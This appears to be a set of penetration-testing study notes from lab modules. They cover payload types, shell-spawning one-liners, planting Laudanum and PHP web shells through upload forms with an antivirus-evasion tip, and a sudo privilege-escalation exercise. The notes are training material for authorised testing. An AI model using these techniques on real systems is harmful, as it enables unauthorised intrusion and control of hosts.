| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zerologon&lt;/code&gt;       | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.              |&lt;/p&gt;
&lt;h2 id=&quot;bats-dlls--msi-files-oh-my&quot;&gt;Bats, DLLs, &amp;amp; MSI Files, Oh My!&lt;/h2&gt;

&lt;p&gt;When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.&lt;/p&gt;

&lt;h4 id=&quot;payload-types-to-consider&quot;&gt;Payload Types to Consider&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library&quot;&gt;DLLs&lt;/a&gt; A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://commandwindows.com/batch.htm&quot;&gt;Batch&lt;/a&gt; Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bat&lt;/code&gt;. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.guru99.com/introduction-to-vbscript.html&quot;&gt;VBS&lt;/a&gt; VBScript is a lightweight scripting language based on Microsoft’s Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions&quot;&gt;MSI&lt;/a&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.MSI&lt;/code&gt; files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msiexec&lt;/code&gt; to execute our file, which will provide us with further access, such as an elevated reverse shell.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1&quot;&gt;Powershell&lt;/a&gt; Powershell is both a shell environment and scripting language. It serves as Microsoft’s modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now that we understand what each type of Windows file can be used for let’s discuss some basic tools, tactics, and procedures for building our payloads and delivering them onto the host to land a shell.&lt;/p&gt;

&lt;h4 id=&quot;payload-generation&quot;&gt;Payload Generation&lt;/h4&gt;

&lt;p&gt;We have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.&lt;/p&gt;

&lt;p&gt;| &lt;strong&gt;Resource&lt;/strong&gt;                      | &lt;strong&gt;Description&lt;/strong&gt;                                                                                                                                                                                                                                                                                                   |
| ——————————— | —————————————————————————————————————————————————————————————————————————————————————————————————————– |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSFVenom &amp;amp; Metasploit-Framework&lt;/code&gt; | &lt;a href=&quot;https://github.com/rapid7/metasploit-framework&quot;&gt;Source&lt;/a&gt; MSF is an extremely versatile tool for any pentester’s toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Payloads All The Things&lt;/code&gt;         | &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings&quot;&gt;Source&lt;/a&gt; Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mythic C2 Framework&lt;/code&gt;             | &lt;a href=&quot;https://github.com/its-a-feature/Mythic&quot;&gt;Source&lt;/a&gt; The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nishang&lt;/code&gt;                         | &lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;Source&lt;/a&gt; Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Darkarmour&lt;/code&gt;                      | &lt;a href=&quot;https://github.com/bats3c/darkarmour&quot;&gt;Source&lt;/a&gt; Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |&lt;/p&gt;
&lt;h4 id=&quot;payload-transfer-and-execution&quot;&gt;Payload Transfer and Execution:&lt;/h4&gt;

&lt;p&gt;Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt;: &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt; is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmi&lt;/code&gt;, Kerberos, and the ability to stand up an SMB server.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md&quot;&gt;Payloads All The Things&lt;/a&gt;: is a great resource to find quick oneliners to help transfer files across hosts expediently.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt;: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote execution via MSF&lt;/code&gt;: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Other Protocols&lt;/code&gt;: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;spawning-interactive-shells&quot;&gt;Spawning Interactive Shells&lt;/h1&gt;

&lt;p&gt;At the end of the last section, we established a shell session with the target. Initially, our shell was limited (sometimes referred to as a jail shell), so we used python to spawn a TTY bourne shell to give us access to more commands and a prompt to work from. This will likely be a situation we find ourselves in more and more as we practice on Hack The Box and in the real world on engagements.&lt;/p&gt;

&lt;p&gt;There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it’s good to know that we could use several different methods to spawn an interactive shell. Let’s examine some of them.&lt;/p&gt;

&lt;p&gt;Know that whenever we see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bourne shell&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;) and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bourne again shell&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;) present on the system natively.&lt;/p&gt;

&lt;h3 id=&quot;binsh--i&quot;&gt;/bin/sh -i&lt;/h3&gt;

&lt;p&gt;This command will execute the shell interpreter specified in the path in interactive mode (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-i&lt;/code&gt;).&lt;/p&gt;

&lt;h4 id=&quot;interactive&quot;&gt;Interactive&lt;/h4&gt;

&lt;p&gt;Spawning Interactive Shells&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
sh: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
sh-4.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;perl&quot;&gt;Perl&lt;/h2&gt;

&lt;p&gt;If the programming language &lt;a href=&quot;https://www.perl.org&quot;&gt;Perl&lt;/a&gt; is present on the system, these commands will execute the shell interpreter specified.&lt;/p&gt;

&lt;h4 id=&quot;perl-to-shell&quot;&gt;Perl To Shell&lt;/h4&gt;

&lt;p&gt;Spawning Interactive Shells&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl —e &lt;span class=&quot;s1&quot;&gt;&apos;exec &quot;/bin/sh&quot;;&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ruby&quot;&gt;Ruby&lt;/h2&gt;

&lt;p&gt;If the programming language &lt;a href=&quot;https://www.ruby-lang.org/en/&quot;&gt;Ruby&lt;/a&gt; is present on the system, this command will execute the shell interpreter specified:&lt;/p&gt;

&lt;h4 id=&quot;ruby-to-shell&quot;&gt;Ruby To Shell&lt;/h4&gt;

&lt;p&gt;Spawning Interactive Shells&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ruby: &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the programming language &lt;a href=&quot;https://www.lua.org&quot;&gt;Lua&lt;/a&gt; is present on the system, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.execute&lt;/code&gt; method to execute the shell interpreter specified using the full command below:&lt;/p&gt;

&lt;h4 id=&quot;lua-to-shell&quot;&gt;Lua To Shell&lt;/h4&gt;

&lt;p&gt;Spawning Interactive Shells&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lua: os.execute&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;awk&quot;&gt;AWK&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BEGIN {system(&quot;/bin/sh&quot;)}&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;find&quot;&gt;Find&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man1/find.1.html&quot;&gt;Find&lt;/a&gt; is a command present on most Unix/Linux systems widely used to search for &amp;amp; through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.&lt;/p&gt;

&lt;h4 id=&quot;using-find-for-a-shell&quot;&gt;Using Find For A Shell&lt;/h4&gt;

&lt;p&gt;Spawning Interactive Shells&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; nameoffile &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; /bin/awk &lt;span class=&quot;s1&quot;&gt;&apos;BEGIN {system(&quot;/bin/sh&quot;)}&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;vim&quot;&gt;VIM&lt;/h2&gt;

&lt;p&gt;Yes, we can set the shell interpreter language from within the popular command-line-based text-editor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VIM&lt;/code&gt;. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.&lt;/p&gt;

&lt;h4 id=&quot;vim-to-shell&quot;&gt;Vim To Shell&lt;/h4&gt;

&lt;p&gt;Spawning Interactive Shells&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;:!/bin/sh&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim
:set &lt;span class=&quot;nv&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
:shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;sudo--l&quot;&gt;Sudo -l&lt;/h4&gt;

&lt;p&gt;Spawning Interactive Shells&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;apache on ILF-WebSrv:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User apache may run the following commands on ILF-WebSrv:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: ALL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;laudanum-one-webshell-to-rule-them-all&quot;&gt;Laudanum, One Webshell to Rule Them All&lt;/h1&gt;

&lt;p&gt;Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asp, aspx, jsp, php,&lt;/code&gt; and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it &lt;a href=&quot;https://github.com/jbarcia/Web-Shells/tree/master/laudanum&quot;&gt;here&lt;/a&gt;. Let’s examine Laudanum and see how it works.&lt;/p&gt;

&lt;h2 id=&quot;working-with-laudanum&quot;&gt;Working with Laudanum&lt;/h2&gt;

&lt;p&gt;The Laudanum files can be found in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/laudanum&lt;/code&gt; directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacking&lt;/code&gt; host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.&lt;/p&gt;

&lt;h2 id=&quot;laudanum-demonstration&quot;&gt;Laudanum Demonstration&lt;/h2&gt;

&lt;p&gt;Now that we understand what Laudanum is and how it works, let’s look at a web application we have found in our lab environment and see if we can run a web shell. If you wish to follow along with this demonstration, you will need to add an entry into your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file on your attack VM or within Pwnbox for the host we are attacking. That entry should read: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;target ip&amp;gt; status.inlanefreight.local&lt;/code&gt;. Once this is done, you can play and explore this demonstration as long as you are on the VPN or using Pwnbox.&lt;/p&gt;

&lt;h4 id=&quot;move-a-copy-for-modification&quot;&gt;Move a Copy for Modification&lt;/h4&gt;

&lt;p&gt;Laudanum, One Webshell to Rule Them All&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Add your IP address to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowedIps&lt;/code&gt; variable on line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;59&lt;/code&gt;. Make any other changes you wish. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.&lt;/p&gt;

&lt;h4 id=&quot;modify-the-shell-for-use&quot;&gt;Modify the Shell for Use&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/115/modify-shell.png&quot; alt=&quot;The image shows a code snippet in a text editor. It highlights an array of allowed IP addresses, including &amp;quot;10.10.14.12&amp;quot;. A yellow arrow points to this line, indicating its significance.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are taking advantage of the upload function at the bottom of the status page(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Green Arrow&lt;/code&gt;) for this to work. Select your shell file and hit upload. If successful, it should print out the path to where the file was saved (Yellow Arrow). Use the upload function. Success prints out where the file went, navigate to it.&lt;/p&gt;

&lt;h4 id=&quot;take-advantage-of-the-upload-function&quot;&gt;Take Advantage of the Upload Function&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/115/laud-upload.png&quot; alt=&quot;The image shows a server status page with BIOS, disk, and services information. Several services are marked as &amp;quot;Stopped&amp;quot; in red. A section for importing configuration files is highlighted with a yellow arrow pointing to the file path and a green arrow pointing to the &amp;quot;Upload File&amp;quot; button.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the upload is successful, you will need to navigate to your web shell to utilize its functions. The image below shows us how to do it. As seen from the last image, our shell was uploaded to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\files\&lt;/code&gt; directory, and the name was kept the same. This won’t always be the case. You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards. For now, we are lucky that’s not the case. With this particular web application, our file went to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;status.inlanefreight.local\\files\demo.aspx&lt;/code&gt; and will require us to browse for the upload by using that \ in the path instead of the / like normal. Once you do this, your browser will clean it up in your URL window to appear as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;status.inlanefreight.local//files/demo.aspx&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;navigate-to-our-shell&quot;&gt;Navigate to Our Shell&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/115/laud-nav.png&quot; alt=&quot;The image shows a Laundanum ASPX Shell interface with a command input field labeled &amp;quot;cmd /c&amp;quot; and a &amp;quot;Submit Query&amp;quot; button. A green arrow points to the URL &amp;quot;status.inlanefreight.local/files/demo.aspx&amp;quot; in the browser&apos;s address bar.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now utilize the Laudanum shell we uploaded to issue commands to the host. We can see in the example that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; command was run.&lt;/p&gt;

&lt;h4 id=&quot;shell-success&quot;&gt;Shell Success&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/115/laud-success.png&quot; alt=&quot;The image shows a Laundanum ASPX Shell interface displaying system information. It includes details like host name, OS version, manufacturer, system type, processor, memory, and network card information. The command &amp;quot;systeminfo&amp;quot; is executed, and the output is shown under &amp;quot;STDOUT&amp;quot; in the browser window.&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;aspx-and-a-quick-learning-tip&quot;&gt;ASPX and a Quick Learning Tip&lt;/h2&gt;

&lt;p&gt;Before diving into aspx shell concepts and exercises, we should take the time to cover a learning resource that can help reinforce most of the concepts covered here in HTB Academy. Occasionally it can be a challenge to visualize a concept using just one learning method. It is good to supplement reading with watching demonstrations and performing hands-on as we have been doing thus far. Video walkthroughs can be an amazing way to learn concepts, plus they can be consumed casually (eating lunch, laying in bed, sitting on the couch, etc.). One great resource to use in learning is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPPSEC&apos;s&lt;/code&gt; blog site &lt;a href=&quot;https://ippsec.rocks/?#&quot;&gt;ippsec.rocks&lt;/a&gt;. The site is a powerful learning tool. Take, for example, the concept of web shells. We can use his site to type in the concept we want to learn, like aspx.![[IPPSEC.png]]&lt;/p&gt;

&lt;h2 id=&quot;aspx-explained&quot;&gt;ASPX Explained&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Active Server Page Extended&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASPX&lt;/code&gt;) is a file type/extension written for &lt;a href=&quot;https://docs.microsoft.com/en-us/aspnet/overview&quot;&gt;Microsoft’s ASP.NET Framework&lt;/a&gt;. On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let’s witness this first-hand by utilizing the Antak Webshell.&lt;/p&gt;

&lt;p&gt;Antak is a web shell built-in ASP.Net included within the &lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;Nishang project&lt;/a&gt;. Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let’s keep our eyes on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Antak&lt;/code&gt;. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell. It’s time to dive in and experiment with Antak.&lt;/p&gt;

&lt;h1 id=&quot;php-web-shells&quot;&gt;PHP Web Shells&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;Hypertext Preprocessor or &lt;a href=&quot;https://www.php.net&quot;&gt;PHP&lt;/a&gt; is an open-source general-purpose scripting language typically used as part of a web stack that powers a website. At the time of this writing (October 2021), PHP is the most popular &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-side programming language&lt;/code&gt;. According to a &lt;a href=&quot;https://w3techs.com/technologies/details/pl-php&quot;&gt;recent survey&lt;/a&gt; conducted by W3Techs, “PHP is used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;78.6%&lt;/code&gt; of all websites whose server-side programming language we know”.&lt;/p&gt;

&lt;p&gt;Let’s consider a practical example of filling out the user account and password fields on a login web form.&lt;/p&gt;

&lt;p&gt;We will be using &lt;a href=&quot;https://github.com/WhiteWinterWolf/wwwolf-php-webshell&quot;&gt;WhiteWinterWolf’s PHP Web Shell&lt;/a&gt;. We can download this or copy and paste the source code into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; file. Keep in mind that the file type is significant, as we will soon witness. Our goal is to upload the PHP web shell via the Vendor Logo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;browse&lt;/code&gt; button. Attempting to do this initially will fail since rConfig is checking for the file type. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Start Burp Suite, navigate to the browser’s network settings menu and fill out the proxy settings. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; will go in the IP address field, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt; will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;mastering-binaries-with-dockers&quot;&gt;Mastering binaries with Dockers&lt;/h2&gt;

&lt;p&gt;Question: The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;  
Sudo version 1.8.31
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h6 id=&quot;with-some-basic-cultur&quot;&gt;With some basic cultur&lt;/h6&gt;

&lt;p&gt;Finding this on Google it says there’s a promising C code for doing alteration of sudo with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoedit&lt;/code&gt;.
All research credit: &lt;strong&gt;Qualys Research Team&lt;/strong&gt; Check out the details on their &lt;a href=&quot;https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit&quot;&gt;blog&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can check your version of sudo is vulnerable with: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudoedit -s Y&lt;/code&gt;. If it asks for your password it’s most likely vulnerable, if it prints usage information it isn’t. You can downgrade to the vulnerable version on Ubuntu 20.04 for testing purposes with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo apt install sudo=1.8.31-1ubuntu1&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Usege  `make &amp;amp;&amp;amp; ./exploit`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

